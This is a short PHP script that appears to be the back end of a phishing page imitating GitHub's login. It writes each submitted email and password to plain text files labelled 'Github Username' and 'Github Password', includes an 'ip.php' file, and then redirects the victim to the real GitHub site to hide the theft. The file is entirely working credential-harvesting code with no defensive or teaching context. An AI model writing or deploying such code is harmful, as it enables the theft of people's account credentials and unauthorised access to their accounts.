<?php
include 'ip.php';
file_put_contents("usernames.txt", "Github Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Github Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://github.com/');
?>
